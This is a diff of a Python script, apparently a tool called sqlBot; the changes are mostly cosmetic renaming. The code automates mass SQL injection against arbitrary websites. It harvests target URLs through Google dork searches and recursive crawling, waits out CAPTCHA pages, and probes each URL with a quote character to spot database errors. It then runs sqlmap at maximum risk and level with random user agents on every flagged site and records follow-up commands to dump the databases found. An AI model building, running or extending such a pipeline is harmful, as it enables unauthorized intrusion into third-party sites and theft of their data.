@@ -18,45 +18,44 @@ from selenium.common.exceptions import NoSuchWindowException
 import _thread
 
 
-
 # DO NOT CHANGE THIS
-false = 0
-sql_error = 1
-size_change = 2
-blue_font = '\033[94m'  # getsColor
-yellow_font = '\033[93m'  # testsites color
-green_font = '\033[92m'  # exploit color
-end_font = '\033[0m'  # end color
+FALSE = 0
+SQL_ERROR = 1
+SIZE_CHANGE = 2
+BLUE_FONT = '\033[94m'  # getsColor
+YELLOW_FONT = '\033[93m'  # test_sites color
+GREEN_FONT = '\033[92m'  # exploit color
+END_FONT = '\033[0m'  # end color
 # CONFIGURATION FILES
-sqlMapPath = ".."
-priority_file = "sqlVulnerable.txt"
-priority_file_lock = False
-error_file = "maybeVulnerable.txt"
-error_file_lock = False
-sites_file = "google.txt"
-recursive_sites_file = "googleRecursive.txt"
-recursive_sites_file_lock = False
-sites_file_lock = False
-dork_list_file = "dorks.txt"
-dork_list_file_lock = False
-proxy_file = "proxy.txt"
-proxy_file_lock = False
-banning_file = "banningIA.txt"
-banning_file_lock = False
+SQLMAP_PATH = ".."
+PRIORITY_FILE = "sqlVulnerable.txt"
+PRIORITY_FILE_LOCK = False
+ERROR_FILE = "maybeVulnerable.txt"
+ERROR_FILE_LOCK = False
+SITES_FILE = "google.txt"
+RECURSIVE_SITES_FILE = "googleRecursive.txt"
+RECURSIVE_SITES_FILE_LOCK = False
+SITES_FILE_LOCK = False
+DORK_LIST_FILE = "dorks.txt"
+DORK_LIST_FILE_LOCK = False
+#PROXY_FILE = "proxy.txt"
+#PROXY_FILE_lock = False
+BANNING_FILE = "banningIA.txt"
+BANNING_FILE_LOCK = False
 
-firefox_driver = '/Users/s-man/Desktop/sqlBot/mac'
+FIREFOX_DRIVER = '/Users/s-man/Desktop/sqlBot/mac'
 
-banned_keywords_file = "banned.txt"
-banned_keywords_file_lock = False
-banned_keywords = []
+BANNED_KEYWORDS_FILE = "banned.txt"
+BANNED_KEYWORDS_FILE_LOCK = False
+BANNED_KEYWORDS = []
 
 
 def getDomainName(link):
-    if(link[-1] == '\n'):
+    if link[-1] == '\n':
         link = link[:-1]
     x = link
     x = x[x.find('//') + 2:]
-    if(x.find('/') != -1):
+    if x.find('/') != -1:
         x = x[:x.find('/')]
 
     if x[0:4] == 'www.':
@@ -66,7 +65,7 @@ def getDomainName(link):
 
     x = x[0:x.rfind(".")]
 
-    if(x.rfind(".") == -1):
+    if x.rfind(".") == -1:
         result = x + result
     else:
         result = x[x.rfind(".") + 1:] + result
@@ -74,11 +73,13 @@ def getDomainName(link):
 
 
 def valid(link):
-    if(link[-1] == '/'):
+    if link[-1] == '/':
         link = link[:-1]
-    banned_keywords = get_sites(banned_keywords_file, banned_keywords_file_lock)
-    queue = get_sites(priority_file, priority_file_lock) + \
-        get_sites(error_file, error_file_lock)
+    BANNED_KEYWORDS = get_sites(
+        BANNED_KEYWORDS_FILE,
+        BANNED_KEYWORDS_FILE_LOCK)
+    queue = get_sites(PRIORITY_FILE, PRIORITY_FILE_LOCK) + \
+        get_sites(ERROR_FILE, ERROR_FILE_LOCK)
     bannedExt = [".html", ".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
     # print(link+'\n')
     for ext in bannedExt:
@@ -88,16 +89,16 @@ def valid(link):
     if link[link.find('//') + 2:].find('/') == -1:
         print("NO : site without parameters\n")
         return False
-    for keyword in banned_keywords:
-        if(keyword == '' or keyword == "\n"):
+    for keyword in BANNED_KEYWORDS:
+        if keyword == '' or keyword == "\n":
             continue
-        if(keyword[len(keyword) - 1] == '\n'):
+        if keyword[len(keyword) - 1] == '\n':
             keyword = keyword[:len(keyword) - 1]
         if getDomainName(link).find(keyword) != -1:
             print("NO : " + keyword + "domain banned\n")
             return False
     for keyword in queue:
-        if(keyword[len(keyword) - 1] == '\n'):
+        if keyword[len(keyword) - 1] == '\n':
             keyword = keyword[:len(keyword) - 1]
         if getDomainName(link).find(getDomainName(keyword)) != -1:
             print("NO : " + keyword + "domain already in queue\n")
@@ -109,23 +110,23 @@ def valid(link):
 def checkExt(url):
     bannedExts = [".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
     for bannedExt in bannedExts:
-        if(url.find(bannedExt + "?") != -1):
+        if url.find(bannedExt + "?") != -1:
 
             return False
-        elif(url[len(url) - len(bannedExt):] == bannedExt):
+        elif url[len(url) - len(bannedExt):] == bannedExt:
 
             return False
     # print("ok")
     return True
 
 
-def checkExtForInjection(url):
+def check_ext_for_injection(url):
     bannedExts = [".jpg", ".html", ".jpeg", ".png", ".pdf", ");", ".js"]
     for bannedExt in bannedExts:
-        if(url.find(bannedExt + "?") != -1):
+        if url.find(bannedExt + "?") != -1:
             print("no ext banned")
             return False
-        elif(url[len(url) - len(bannedExt):] == bannedExt):
+        elif url[len(url) - len(bannedExt):] == bannedExt:
             print("no ext banned")
             return False
     # print("ok")
@@ -140,17 +141,17 @@ def filterListOfRecursive(liste):
             if getDomainName(l) == getDomainName(valid):
                 add = False
                 break
-        if(add):
-            if(l[len(l)] - 1 == '/'):
+        if add:
+            if l[len(l)] - 1 == '/':
                 l = l[:len(l) - 1]
             result.append(l)
     return result
 
 
 def getRecursiveUrls(link, recurive_search):
-    if(recurive_search == 0):
+    if recurive_search == 0:
         return []
-    # if(browser==0):
+    # if browser==0):
     #	browser = webdriver.Firefox()
     #	browser.set_page_load_timeout(15)
     text = ""
@@ -164,7 +165,7 @@ def getRecursiveUrls(link, recurive_search):
         req = request.Request(link, headers=headers)
         response = request.urlopen(req)
         text = response.read().decode("utf-8")
-        # siteLen=len(pageSource)
+        # site_len=len(page_source)
     except BaseException:
         print("error opening site" + link)
         text = ""
@@ -186,7 +187,7 @@ def getRecursiveUrls(link, recurive_search):
     # urlsFiltered=[i for i in urlsFiltered if]
 
     print("extracted %s filtred %s" % (str(len(urls)), str(len(urlsFiltered))))
-    append_sitesOnFile(urlsFiltered, sites_file, sites_file_lock)
+    append_sitesOnFile(urlsFiltered, SITES_FILE, SITES_FILE_LOCK)
 
     for url in urlsFiltered:
         getRecursiveUrls(url, recurive_search - 1)
@@ -216,7 +217,7 @@ def extract_sites(query):
             source = browser.page_source.find('g-recaptcha-response')
             pass
 
-        while (source != -1):
+        while source != -1:
             time.sleep(60)
             try:
                 source = browser.page_source.find('g-recaptcha-response')
@@ -248,8 +249,8 @@ def extract_sites(query):
             page += 10
 
     print("%s sites extracted \n" % str(len(liste)))
-    append_sitesOnFile(liste, sites_file, sites_file_lock)
-    append_sitesOnFile(liste, recursive_sites_file, recursive_sites_file_lock)
+    append_sitesOnFile(liste, SITES_FILE, SITES_FILE_LOCK)
+    append_sitesOnFile(liste, RECURSIVE_SITES_FILE, RECURSIVE_SITES_FILE_LOCK)
     browser.close()
 
 
@@ -258,20 +259,20 @@ def testChar(source, sizeOfOriginal):
     for keyword in keywords:
         if source.lower().find(keyword) != -1:
             print(keyword + " keyword found")
-            return sql_error
+            return SQL_ERROR
     if abs(sizeOfOriginal - len(source)) > 100:
         print("size change")
-        return size_change
+        return SIZE_CHANGE
     else:
         print("not vulnerable")
         return False
 
 
-def testSite(site):
-    if(site[-1] == '\n'):
+def test_site(site):
+    if site[-1] == '\n':
         site = site[0:-1]
 
-    sqlChars = ['\'']
+    sql_chars = ['\'']
 
     headers = {
         'Referer': 'http://www.google.com/bot.html',
@@ -281,82 +282,82 @@ def testSite(site):
     try:
         req = request.Request(site, headers=headers)
         response = request.urlopen(req)
-        pageSource = response.read().decode("utf-8")
-        siteLen = len(pageSource)
+        page_source = response.read().decode("utf-8")
+        site_len = len(page_source)
     except BaseException:
         print("error opening site")
         return False
 
-    for sqlChar in sqlChars:
+    for sql_char in sql_chars:
 
         result = False
         try:
-            req = request.Request(site + sqlChar, headers=headers)
+            req = request.Request(site + sql_char, headers=headers)
             response = request.urlopen(req)
-            pageSource = response.read().decode("utf-8")
-            result = testChar(pageSource, siteLen)
+            page_source = response.read().decode("utf-8")
+            result = testChar(page_source, site_len)
 
         except Exception as err:
             print("error opening site with injection char")
 
             return False
 
-        if(result == sql_error or result == size_change):
+        if result == SQL_ERROR or result == SIZE_CHANGE:
 
             return result
 
     return False
 
 
-def test_sites(sites_file_lock):
+def test_sites(SITES_FILE_LOCK):
 
-    lSql = []
-    lError = []
+    l_sql = []
+    l_error = []
     i = 0
 
-    sitesNum = get_number(sites_file, sites_file_lock)
+    sites_num = get_number(SITES_FILE, SITES_FILE_LOCK)
 
-    while(sitesNum == 0):
-        print(yellow_font + "Waiting for vulnerable sites to come\n" + end_font)
+    while sites_num == 0:
+        print(YELLOW_FONT + "Waiting for vulnerable sites to come\n" + END_FONT)
         time.sleep(60)
-        sitesNum = get_number(sites_file, sites_file_lock)
+        sites_num = get_number(SITES_FILE, SITES_FILE_LOCK)
 
-    while(sitesNum > 0):
-        site = get_site(sites_file, sites_file_lock)
-        if(site[len(site) - 1] == '/'):
+    while sites_num > 0:
+        site = get_site(SITES_FILE, SITES_FILE_LOCK)
+        if site[len(site) - 1] == '/':
             site = site[0:len(site) - 1]
         i += 1
-        print((yellow_font + "Testing site %s of %s %s" + end_font) %
-              (sitesNum, str(i), site))
-        if(site[-1] == '\n'):
+        print((YELLOW_FONT + "Testing site %s of %s %s" + END_FONT) %
+              (sites_num, str(i), site))
+        if site[-1] == '\n':
             site = site[0:-1]
-        if(checkExtForInjection(site) and valid(site)):
+        if check_ext_for_injection(site) and valid(site):
 
-            res = testSite(site)
-            if res == sql_error:
-                print(yellow_font + "sql" + end_font)
-                lSql.append(site)
-                appendSiteOnFile(
+            res = test_site(site)
+            if res == SQL_ERROR:
+                print(YELLOW_FONT + "sql" + END_FONT)
+                l_sql.append(site)
+                append_site_on_file(
                     site + "\n",
-                    priority_file,
-                    priority_file_lock)
-            elif res == size_change:
-                print(yellow_font + "maybe" + end_font)
-                lError.append(site)
-                appendSiteOnFile(site + "\n", error_file, error_file_lock)
-        sitesNum = get_number(sites_file, sites_file_lock)
-        while(sitesNum == 0):
+                    PRIORITY_FILE,
+                    PRIORITY_FILE_LOCK)
+            elif res == SIZE_CHANGE:
+                print(YELLOW_FONT + "maybe" + END_FONT)
+                l_error.append(site)
+                append_site_on_file(site + "\n", ERROR_FILE, ERROR_FILE_LOCK)
+        sites_num = get_number(SITES_FILE, SITES_FILE_LOCK)
+        while sites_num == 0:
             print(
-                yellow_font +
+                YELLOW_FONT +
                 "Waiting for vulnerable sites to come\n" +
-                end_font)
+                END_FONT)
             time.sleep(60)
-            sitesNum = get_number(sites_file, sites_file_lock)
+            sites_num = get_number(SITES_FILE, SITES_FILE_LOCK)
 
-    return (lSql, lError)
+    return (l_sql, l_error)
 
 
-def get_sitesByDork(dork):
+def get_sites_by_dork(dork):
     dork = dork.replace('&', '%26')
     dork = dork.replace(' ', '+')
     extract_sites(dork)
@@ -364,7 +365,7 @@ def get_sitesByDork(dork):
 
 def append_sitesOnFile(l, file, lock):
 
-    while(lock):
+    while lock:
         print("Waiting for %s To be unlocked" % (file))
     lock = True
     #print(str(len(l))+" have to be writed")
@@ -376,7 +377,7 @@ def append_sitesOnFile(l, file, lock):
 #	for site in l:
     #	print(" %s not in sites %s"%(getDomainName(site), getDomainName(site) not in sites))
     #	print(sites)
-#		if( getDomainName(site) not in sites ):
+#		if  getDomainName(site) not in sites ):
     #		sites.append(site)
     #		newL.append(site)
     #newL=[site for site in l if getDomainName(site) not in sites ]
@@ -387,17 +388,17 @@ def append_sitesOnFile(l, file, lock):
     lock = False
 
 
-def appendSiteOnFile(site, fileName, lock):
+def append_site_on_file(site, file_name, lock):
 
-    while(lock):
+    while lock:
         print("waiting for %s To be Unlocked" % (file))
     lock = True
 
-    #file  = open(fileName, "r")
+    #file  = open(file_name, "r")
     #sites =[ getDomainName(f) for f in file.readlines() if f  !="\n" ]
     # file.close()
-    file = open(fileName, "a")
-    # if(getDomainName(site) in sites):
+    file = open(file_name, "a")
+    # if getDomainName(site) in sites):
     #	print("site already in file")
     # else:
     file.write('%s' % site)
@@ -406,18 +407,18 @@ def appendSiteOnFile(site, fileName, lock):
     lock = False
 
 
-def testIfBan(liste, site, banning_file_lock):
-    if(site[-1] == '\n'):
+def test_if_ban(liste, site, BANNING_FILE_LOCK):
+    if site[-1] == '\n':
         site = site[0:-1]
     numOfTests = 1
     result = False
     for siteToCheck in liste:
 
-        if(siteToCheck.find(site) != -1):
+        if siteToCheck.find(site) != -1:
 
             liste.remove(siteToCheck)
             numOfTests = int(siteToCheck.split(":")[1])
-            if(numOfTests > 5):
+            if numOfTests > 5:
                 result = True
                 print(site + " banned")
             else:
@@ -428,15 +429,15 @@ def testIfBan(liste, site, banning_file_lock):
     if not result:
 
         liste.append(site + ":" + str(numOfTests) + "\n")
-    while(banning_file_lock):
-        print("waiting for %s To be Unlocked" % (banning_file))
-    banning_file_lock = True
+    while BANNING_FILE_LOCK:
+        print("waiting for %s To be Unlocked" % (BANNING_FILE))
+    BANNING_FILE_LOCK = True
 
-    files = open(banning_file, "w")
+    files = open(BANNING_FILE, "w")
     files.writelines(liste)
     files.close()
 
-    banning_file_lock = False
+    BANNING_FILE_LOCK = False
 
     return result
 
@@ -444,21 +445,21 @@ def testIfBan(liste, site, banning_file_lock):
 def filter():
     files = os.listdir("finished")
     for file in files:
-        dbList = []
+        db_list = []
         if file[0] != ".":
             print("Checking file " + file, end="")
             f = open("finished/" + file, "r")
             found = False
             lines = f.readlines()
-            if(len(lines) > 1):
+            if len(lines) > 1:
                 site = lines[0]
-                if(site[-1] == "\n"):
+                if site[-1] == "\n":
                     site = site[:-1]
                 lines = lines[1:]
             for line in lines:
                 if line.find("[*] ") != -1 and line.find("[*] ending") == - \
                         1 and line.find("[*] starting") == -1:
-                    dbList.append(
+                    db_list.append(
                         line.replace(
                             '\n', '')[
                             line.find("[*] ") + 4:])
@@ -467,22 +468,24 @@ def filter():
             if not found:
                 os.remove("finished/" + file)
                 print("\n")
-                listOfRemoved = get_sites(banning_file, banning_file_lock)
+                list_of_removed = get_sites(BANNING_FILE, BANNING_FILE_LOCK)
 
-                if(testIfBan(listOfRemoved, file[:-7] + "\n", banning_file_lock)):
-                    appendSiteOnFile(file[:-7] + "\n",
-                                     banned_keywords_file,
-                                     banned_keywords_file_lock)
+                if test_if_ban(list_of_removed,
+                               file[:-7] + "\n",
+                               BANNING_FILE_LOCK):
+                    append_site_on_file(file[:-7] + "\n",
+                                        BANNED_KEYWORDS_FILE,
+                                        BANNED_KEYWORDS_FILE_LOCK)
 
             else:
-                if(len(dbList) > 0):
+                if len(db_list) > 0:
                     print(" Found db\n")
                     with open("dbs/" + file, "w+") as result:
                         result.write(site + "\n")
-                        for db in dbList:
+                        for db in db_list:
                             result.write(
                                 "python " +
-                                sqlMapPath +
+                                SQLMAP_PATH +
                                 "/sqlmap/sqlmap.py -u %s --risk 3 --level 5 --batch --random-agent -D " %
                                 (site,
                                  ) +
@@ -497,13 +500,13 @@ def filter():
             f.close()
 
 
-def get_site(fileName, lock):
+def get_site(file_name, lock):
 
-    while(lock):
-        print("waiting for %s To be Unlocked" % (fileName))
+    while lock:
+        print("waiting for %s To be Unlocked" % (file_name))
     lock = True
 
-    files = open(fileName, "r")
+    files = open(file_name, "r")
     sites = files.readlines()
     files.close()
     site = sites[0]
@@ -513,8 +516,8 @@ def get_site(fileName, lock):
 
     #sites = sites[1:]
 
-    files = open(fileName, "w")
-    if(len(sites) > 0):
+    files = open(file_name, "w")
+    if len(sites) > 0:
         files.writelines(sites)
     files.close()
 
@@ -524,25 +527,25 @@ def get_site(fileName, lock):
     return site
 
 
-def get_sites(fileName, lock):
+def get_sites(file_name, lock):
 
-    while(lock):
-        print("waiting for %s To be Unlocked" % (fileName))
+    while lock:
+        print("waiting for %s To be Unlocked" % (file_name))
     lock = True
 
-    files = open(fileName, "r")
+    files = open(file_name, "r")
     sites = files.readlines()
 
     return sites
 
 
-def get_number(fileName, lock):
+def get_number(file_name, lock):
 
-    while(lock):
-        print("waiting for %d To be Unlocked" % (fileName))
+    while lock:
+        print("waiting for %d To be Unlocked" % (file_name))
     lock = True
 
-    files = open(fileName, "r")
+    files = open(file_name, "r")
     sites = files.readlines()
     files.close()
 
@@ -554,76 +557,77 @@ def get_number(fileName, lock):
 
 def exploit(max_threads):
 
-    priority_file_number = get_number(priority_file, priority_file_lock)
+    priority_file_number = get_number(PRIORITY_FILE, PRIORITY_FILE_LOCK)
 
-    error_file_number = get_number(error_file, error_file_lock)
+    error_file_number = get_number(ERROR_FILE, ERROR_FILE_LOCK)
 
     os.system("mkdir working")
     os.system("mkdir finished")
     os.system("mkdir dbs")
     os.system("mkdir maybe")
-    while(priority_file_number == 0 and error_file_number == 0):
-        print(green_font + "Waiting for sites to come\n" + end_font)
+    while priority_file_number == 0 and error_file_number == 0:
+        print(GREEN_FONT + "Waiting for sites to come\n" + END_FONT)
         time.sleep(60)
 
-        priority_file_number = get_number(priority_file, priority_file_lock)
+        priority_file_number = get_number(PRIORITY_FILE, PRIORITY_FILE_LOCK)
 
-        error_file_number = get_number(error_file, error_file_lock)
+        error_file_number = get_number(ERROR_FILE, ERROR_FILE_LOCK)
 
     while priority_file_number > 0 or error_file_number > 0:
 
-        while(get_sqlmap_threads() > max_threads):
+        while get_sqlmap_threads() > max_threads:
             print(
-                green_font +
+                GREEN_FONT +
                 "Waiting for others to finish exploit\n" +
-                end_font)
+                END_FONT)
             time.sleep(100)
 
         else:
 
-            if(priority_file_number > 0):
-                site = get_site(priority_file, priority_file_lock)
+            if priority_file_number > 0:
+                site = get_site(PRIORITY_FILE, PRIORITY_FILE_LOCK)
 
             else:
-                site = get_site(error_file, error_file_lock)
+                site = get_site(ERROR_FILE, ERROR_FILE_LOCK)
 
-            priority_file_number = get_number(priority_file, priority_file_lock)
+            priority_file_number = get_number(
+                PRIORITY_FILE, PRIORITY_FILE_LOCK)
 
-            error_file_number = get_number(error_file, error_file_lock)
+            error_file_number = get_number(ERROR_FILE, ERROR_FILE_LOCK)
 
-            if(site[len(site) - 1] == '\n'):
+            if site[len(site) - 1] == '\n':
                 site = site[0:len(site) - 1]
             siteFile = getDomainName(site)
             random_int1 = randint(0, 9)
             random_int2 = randint(0, 9)
             print(
-                green_font +
+                GREEN_FONT +
                 "executing exploit for " +
                 siteFile +
                 "\n" +
-                end_font)
-            command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site,
-                                                                                                                                                                                                                     siteFile, str(random_int1) + str(random_int2), sqlMapPath + "/sqlmap/", site, siteFile, str(random_int1) + str(random_int2), siteFile, str(random_int1) + str(random_int2), siteFile, str(random_int1) + str(random_int2))
+                END_FONT)
+            command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site, siteFile,
+                                                                                                                                                                                                                     str(random_int1) + str(random_int2), SQLMAP_PATH + "/sqlmap/", site, siteFile, str(random_int1) + str(random_int2), siteFile, str(random_int1) + str(random_int2), siteFile, str(random_int1) + str(random_int2))
             os.system(command)
-            while(priority_file_number == 0 and error_file_number == 0):
-                print(green_font + "Waiting for sites to come\n" + end_font)
+            while priority_file_number == 0 and error_file_number == 0:
+                print(GREEN_FONT + "Waiting for sites to come\n" + END_FONT)
                 time.sleep(50)
 
                 priority_file_number = get_number(
-                    priority_file, priority_file_lock)
+                    PRIORITY_FILE, PRIORITY_FILE_LOCK)
 
-                error_file_number = get_number(error_file, error_file_lock)
+                error_file_number = get_number(ERROR_FILE, ERROR_FILE_LOCK)
 
     else:
-        print(green_font + "no sites to test" + end_font)
+        print(GREEN_FONT + "no sites to test" + END_FONT)
 
 
 def all(max_threads, recursive_search_number):
 
     _thread.start_new_thread(gets, ())
-    _thread.start_new_thread(test_sites, (sites_file_lock,))
+    _thread.start_new_thread(test_sites, (SITES_FILE_LOCK,))
     _thread.start_new_thread(exploit, (max_threads,))
-    if(recursive_search_number > 0):
+    if recursive_search_number > 0:
         _thread.start_new_thread(recursive_search, (recursive_search_number,))
 
     while True:
@@ -631,20 +635,20 @@ def all(max_threads, recursive_search_number):
 
 
 def gets():
-    print(blue_font)
-    dorks_number = get_number(dork_list_file, dork_list_file_lock)
+    print(BLUE_FONT)
+    dorks_number = get_number(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)
     while dorks_number == 0:
-        print(blue_font + "Waiting for new dorks" + end_font)
+        print(BLUE_FONT + "Waiting for new dorks" + END_FONT)
         time.sleep(60)
-        dorks_number = get_number(dork_list_file, dork_list_file_lock)
-    while(dorks_number > 0):
-        dork = get_site(dork_list_file, dork_list_file_lock)
-        get_sitesByDork(dork)
-        dorks_number = get_number(dork_list_file, dork_list_file_lock)
+        dorks_number = get_number(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)
+    while dorks_number > 0:
+        dork = get_site(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)
+        get_sites_by_dork(dork)
+        dorks_number = get_number(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)
         while dorks_number == 0:
-            print(blue_font + "Waiting for new dorks" + end_font)
+            print(BLUE_FONT + "Waiting for new dorks" + END_FONT)
             time.sleep(60)
-            dorks_number = get_number(dork_list_file, dork_list_file_lock)
+            dorks_number = get_number(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)
 
     print("End get dorks")
 
@@ -652,17 +656,17 @@ def gets():
 def clean():
     os.system("rm *.txt")
     os.system("rm -rf working finished dbs maybe")
-    os.system("rm -rf " + sqlMapPath + "/sqlmap")
+    os.system("rm -rf " + SQLMAP_PATH + "/sqlmap")
 
 
 def setup():
     try:
-        os.makedirs(sqlMapPath + "/sqlmap")
+        os.makedirs(SQLMAP_PATH + "/sqlmap")
     except BaseException:
         pass
     os.system(
         'git clone https://github.com/sqlmapproject/sqlmap.git ' +
-        sqlMapPath +
+        SQLMAP_PATH +
         "/sqlmap")
     try:
         os.makedirs("dbs")
@@ -679,74 +683,79 @@ def setup():
     os.system("echo \"alias clean='python3 clean.py'\" >> ~/.bashrc ")
     os.system(
         "echo \"alias filter='zeb ; python3 extract_sites.py filter'\" >> ~/.bashrc ")
-    os.system("echo \"alias lss='ls -lia'\" >> ~/.bashrc ")
-    os.system("echo \"alias revnc='vncserver -kill :1 ; vncserver'\" >> ~/.bashrc ")
-    os.system("echo \"alias sites='ps aux | grep sqlmap | sed -E \'/sh -c/d\' | sed -E \'/grep/d\' '\" >> ~/.bashrc ")
-    os.system("echo \"alias webvnc='websockify -D --web=/usr/share/novnc/ --cert=/etc/ssl/novnc.pem 6080 localhost:5901'\" >> ~/.bashrc ")
-    os.system("echo \"alias zeb='cd /root/Desktop/sqlBot'\" >> ~/.bashrc ")
+    os.system(
+        "echo \"alias lss='ls -lia'\" >> ~/.bashrc ")
+    os.system(
+        "echo \"alias revnc='vncserver -kill :1 ; vncserver'\" >> ~/.bashrc ")
+    os.system(
+        "echo \"alias sites='ps aux | grep sqlmap | sed -E \'/sh -c/d\' | sed -E \'/grep/d\' '\" >> ~/.bashrc ")
+    os.system(
+        "echo \"alias webvnc='websockify -D --web=/usr/share/novnc/ --cert=/etc/ssl/novnc.pem 6080 localhost:5901'\" >> ~/.bashrc ")
+    os.system(
+        "echo \"alias zeb='cd /root/Desktop/sqlBot'\" >> ~/.bashrc ")
     os.system(
         "echo \"export PATH=$PATH:\"%s >> ~/.bashrc " %
-        (firefox_driver,))
+        (FIREFOX_DRIVER,))
 
     os.system(
         "touch " +
-        priority_file +
+        PRIORITY_FILE +
         " " +
-        error_file +
+        ERROR_FILE +
         " " +
-        sites_file +
+        SITES_FILE +
         " " +
-        dork_list_file +
+        DORK_LIST_FILE +
         " " +
-        banned_keywords_file +
+        BANNED_KEYWORDS_FILE +
         " " +
-        recursive_sites_file +
+        RECURSIVE_SITES_FILE +
         " " +
-        banning_file)
-    #os.system("echo \"google.\" > "+banned_keywords_file)
+        BANNING_FILE)
+    #os.system("echo \"google.\" > "+BANNED_KEYWORDS_FILE)
 
 
 def recursive_search(number):
 
     print("recurive_search")
-    ready_to_check_number = get_number(sites_file, sites_file_lock)
-    sites_number = get_number(recursive_sites_file, recursive_sites_file_lock)
+    ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)
+    sites_number = get_number(RECURSIVE_SITES_FILE, RECURSIVE_SITES_FILE_LOCK)
     while sites_number == 0:
         print("Waiting for new sites for recursive_search")
         time.sleep(60)
         sites_number = get_number(
-            recursive_sites_file,
-            recursive_sites_file_lock)
+            RECURSIVE_SITES_FILE,
+            RECURSIVE_SITES_FILE_LOCK)
     while ready_to_check_number > 1000:
         print("proirity to readyToCheck_sites")
         time.sleep(60)
-        ready_to_check_number = get_number(sites_file, sites_file_lock)
+        ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)
     #recursiveBrowser = webdriver.Firefox()
-    while(sites_number > 0):
+    while sites_number > 0:
 
-        link = get_site(recursive_sites_file, recursive_sites_file_lock)
+        link = get_site(RECURSIVE_SITES_FILE, RECURSIVE_SITES_FILE_LOCK)
 
         #print("recurive_search for "+link)
         # newListe=
         getRecursiveUrls(link, number)
 
-        ready_to_check_number = get_number(sites_file, sites_file_lock)
+        ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)
         sites_number = get_number(
-            recursive_sites_file,
-            recursive_sites_file_lock)
+            RECURSIVE_SITES_FILE,
+            RECURSIVE_SITES_FILE_LOCK)
 
-        # if(sites_number==0):
+        # if sites_number==0):
         # recursiveBrowser.close()
         while sites_number == 0:
             print("Waiting for new sites for recursive_search")
             time.sleep(60)
             sites_number = get_number(
-                recursive_sites_file,
-                recursive_sites_file_lock)
+                RECURSIVE_SITES_FILE,
+                RECURSIVE_SITES_FILE_LOCK)
         while ready_to_check_number > 1000:
             print("proirity to readyToCheck_sites")
             time.sleep(60)
-            ready_to_check_number = get_number(sites_file, sites_file_lock)
+            ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)
         #recursiveBrowser = webdriver.Firefox()
 
     print("end recurive_search")
@@ -760,29 +769,29 @@ def get_sqlmap_threads():
 
 def main():
 
-    if(len(sys.argv) == 4 and sys.argv[1] == "get"):
-        get_sitesByDork(sys.argv[2])
-        if(int(sys.argv[3]) > 0):
+    if len(sys.argv) == 4 and sys.argv[1] == "get":
+        get_sites_by_dork(sys.argv[2])
+        if int(sys.argv[3]) > 0:
             recursive_search(int(sys.argv[3]))
-        test_sites(sites_file_lock)
+        test_sites(SITES_FILE_LOCK)
 
-    elif(len(sys.argv) == 3 and sys.argv[1] == "exploit"):
+    elif len(sys.argv) == 3 and sys.argv[1] == "exploit":
         max_threads = int(sys.argv[2])
         exploit(max_threads)
 
-    elif(len(sys.argv) == 2 and sys.argv[1] == "filter"):
+    elif len(sys.argv) == 2 and sys.argv[1] == "filter":
         filter()
-    elif(len(sys.argv) == 3 and sys.argv[1] == "recursive_search"):
+    elif len(sys.argv) == 3 and sys.argv[1] == "recursive_search":
         recursive_search(int(sys.argv[2]))
-    elif(len(sys.argv) == 2 and sys.argv[1] == "setup"):
+    elif len(sys.argv) == 2 and sys.argv[1] == "setup":
         setup()
-    elif(len(sys.argv) == 2 and sys.argv[1] == "clean"):
+    elif len(sys.argv) == 2 and sys.argv[1] == "clean":
         clean()
-    elif(len(sys.argv) == 3 and sys.argv[1] == "gets"):
+    elif len(sys.argv) == 3 and sys.argv[1] == "gets":
         gets()
-        if(int(sys.argv[3]) > 0):
+        if int(sys.argv[3]) > 0:
             recursive_search(int(sys.argv[3]))
-    elif(len(sys.argv) == 4 and sys.argv[1] == "all"):
+    elif len(sys.argv) == 4 and sys.argv[1] == "all":
         all(int(sys.argv[2]), int(sys.argv[3]))
     else:
         print("usage : " + sys.argv[0] + " get dork recursive_search\n")
